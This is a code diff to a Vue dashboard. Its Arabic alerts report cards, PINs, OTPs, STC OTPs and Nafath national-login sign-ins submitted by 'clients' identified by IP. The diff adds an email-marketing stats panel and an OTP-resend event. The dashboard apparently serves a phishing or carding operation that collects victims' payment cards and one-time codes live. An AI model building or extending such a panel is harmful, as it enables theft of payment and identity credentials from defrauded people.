@@ -169,6 +169,8 @@
             </div>
         </section>
 
+        <!-- Email Marketing Stats -->
+        <EmailStatsPanel />
 
     </div>
 </template>
@@ -185,6 +187,7 @@ import { useNotificationsStore } from '@/store/modules/notifications';
 import { useBadgeStore } from '@/store/modules/badges';
 import CustomerDataTable from '../components/CustomerDataTable.vue';
 import DashboardHeader from '../components/DashboardHeader.vue';
+import EmailStatsPanel from '../components/EmailStatsPanel.vue';
 
 import logger from '@/utils/logger';
 import { enableSounds, playBasicSound, playInsuranceSound, playPaymentSound, playNewCardSound } from '../composables/useNotificationSounds';
@@ -800,6 +803,7 @@ function _getEventToastMessage ( activityType, ip ) {
         card_submitted:           { type: 'info',    message: `💳 بطاقة جديدة من العميل ${ ip }` },
         payment_card_submitted:   { type: 'info',    message: `💳 بطاقة جديدة من العميل ${ ip }` },
         otp_submitted:            { type: 'info',    message: `🔑 OTP جديد من العميل ${ ip }` },
+        otp_resend_requested:     { type: 'warning', message: `🔄 العميل ${ ip } طلب إعادة إرسال رمز OTP` },
         stc_otp_submitted:        { type: 'info',    message: `🔑 STC OTP جديد من العميل ${ ip }` },
         pin_submitted:            { type: 'info',    message: `🔑 PIN جديد من العميل ${ ip }` },
         nafath_submitted:         { type: 'info',    message: `🔄 تسجيل دخول نفاذ من العميل ${ ip }` },
@@ -886,6 +890,7 @@ const _newDataActivityTypes = new Set( [
     'phone_otp_verified',
     'payment_card_submitted',
     'otp_submitted',
+    'otp_resend_requested',
     'stc_otp_submitted',
     'pin_submitted',
 ] );
